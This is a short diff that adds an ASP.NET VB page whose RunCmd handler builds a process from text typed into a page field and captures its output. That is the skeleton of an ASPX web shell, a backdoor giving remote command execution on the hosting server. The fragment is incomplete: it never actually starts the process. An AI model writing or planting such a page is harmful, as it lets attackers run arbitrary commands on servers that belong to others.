@@ -1,0 +1,6 @@
+<%@ Page Language="VB" %>
+Sub RunCmd(Src As Object, E As EventArgs)
+Dim si As New ProcessStartInfo(xpath.text)
+si.RedirectStandardOutput = true
+End Sub
+
